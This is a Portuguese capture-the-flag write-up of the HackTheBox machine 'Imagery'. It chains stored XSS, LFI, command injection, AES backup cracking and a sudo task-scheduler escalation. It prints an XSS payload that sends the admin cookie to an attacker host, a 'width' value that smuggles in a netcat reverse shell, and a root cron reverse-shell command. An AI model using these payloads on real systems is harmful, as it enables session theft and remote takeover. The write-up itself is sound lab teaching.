---
title: "Imagery"
description: "Máquina Linux Medium com aplicação Python/Werkzeug de upload de imagens. Stored XSS em BugReport para roubo de cookie do admin, LFI no painel administrativo para exfiltrar source code, command injection no endpoint de transformação de imagem para foothold. Lateral movement via cracking de backup AES e privesc via sudo em task scheduler."
date: 2026-04-02
draft: false
locale: "pt"
platform: "HackTheBox"
difficulty: "Medium"
os: "Linux"
tags: ["xss", "lfi", "command-injection", "aes", "sudo", "season-9"]
categories: ["Web", "Privesc", "Lateral Movement"]
---

> Máquina Linux **Medium** com aplicação Python/Werkzeug de upload de imagens. **Stored XSS** em BugReport para roubo de cookie do admin, **LFI** no painel administrativo para exfiltrar source code, **command injection** no endpoint de transformação de imagem para foothold. Lateral movement via cracking de backup **AES** e privesc via **sudo** em task scheduler.

## Recon

### Nmap

```bash
nmap -sV -T4 <TARGET_IP>
```

| Porta    | Serviço | Notas                          |
|----------|---------|--------------------------------|
| 22/tcp   | SSH     | OpenSSH 9.7p1                  |
| 8000/tcp | HTTP    | Werkzeug/3.1.3 Python/3.12.7   |

A aplicação na porta `8000` é uma plataforma de upload de imagens. Análise do código fonte do frontend revelou todas as rotas e chamadas JavaScript, incluindo uma vulnerabilidade de **Stored XSS** na página de BugReport do admin.

## Foothold

### Stored XSS → Cookie Theft

A conta `admin@imagery.htb` era evidente mas protegida por *rate-limit* contra bruteforce. A estratégia foi roubar o cookie de sessão via **Stored XSS** no formulário de BugReport.

Três payloads testados, apenas um funcionou:

```html
<img src=x onerror='new Image().src="http://<ATTACKER_IP>/?c=" + document.cookie'>
```

Tráfego na aplicação (upload de arquivo) foi necessário para triggerar o XSS. Cookie do admin capturado no listener.

### LFI no Painel Admin → Source Code

Com a sessão do admin, a funcionalidade de *logs* era vulnerável a **Local File Inclusion**, permitindo download de arquivos arbitrários do servidor. Isso expôs todo o backend da aplicação, incluindo rotas ocultas com prefixo `api_` que não apareceriam em fuzzing.

### Command Injection em `/apply_visual_transform`

O endpoint `/apply_visual_transform` executava comandos de redimensionamento de imagem sem sanitizar o parâmetro `width`, permitindo **command injection**. O endpoint requeria autenticação como `testuser`.

As credenciais do `testuser` foram obtidas do `db.json` (senhas em hash MD5) extraído via LFI.

```bash
curl -v -X POST "http://<TARGET_IP>:8000/apply_visual_transform" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<TESTUSER_SESSION>" \
  -d '{"imageId": "<UUID>", "transformType": "crop", "params": {"x": 0, "y": 0, "width": "100; busybox nc <ATTACKER_IP> <PORT> -e /bin/bash #", "height": 100}}'
```

Shell obtida como usuário da aplicação. Com esse acesso, a flag de *user* foi obtida.

## Lateral Movement

No home do usuário, logs referenciavam um script `pyAesCrypt` — ferramenta de encriptação/decriptação AES. Um diretório continha um arquivo `.aes` que era um backup antigo da aplicação.

Hash extraído e quebrado com `hashcat`, revelando o backup decriptado com credenciais de uma versão anterior. O arquivo de usuários continha a senha do usuário `mark`.

```bash
ssh mark@<TARGET_IP>
```

## Privilege Escalation

`mark` tinha acesso sudo a um gerenciador de backups e task scheduler:

```bash
sudo -l
# (root) ... auto
```

Agendamento de RCE como root via cron:

```bash
auto add --schedule "* * * * *" --command "busybox nc <ATTACKER_IP> <PORT> -e /bin/bash" --name "RevShell"
```

Após a escalação de privilégios, a flag de *root* foi lida em `/root/root.txt`.

## Attack Path

| Etapa              | Vetor                                                                    |
|--------------------|--------------------------------------------------------------------------|
| Recon              | Werkzeug/Python na porta 8000, source JS expõe rotas e XSS               |
| Foothold           | Stored XSS → cookie admin → LFI → source code → command injection        |
| Lateral Movement   | `pyAesCrypt` backup `.aes` → `hashcat` → credenciais `mark`              |
| Privesc            | sudo task scheduler → cron RCE como root                                 |

## Lessons Learned

- **Análise de frontend**: o JS da aplicação revelou rotas `api_*` ocultas. Sempre ler o bundle minificado em busca de endpoints não documentados.
- **Stored XSS + auth-protected page**: rate-limit no login não protege se existe XSS no formulário de suporte/bug report — o admin acessa aquilo com sessão válida.
- **LFI como amplificador**: com source code em mãos, vulnerabilidades posteriores (command injection em parâmetro `width`) ficam triviais de identificar.
- **Backups criptografados**: `pyAesCrypt` com senha fraca é vetor clássico de lateral movement — hashcat módulo `13600` ou script Python para quebrar.
- **Task scheduler como root**: qualquer binário que aceite comando arbitrário e rode como root é privesc. `auto`, `run-parts`, cron customizados são alvo.
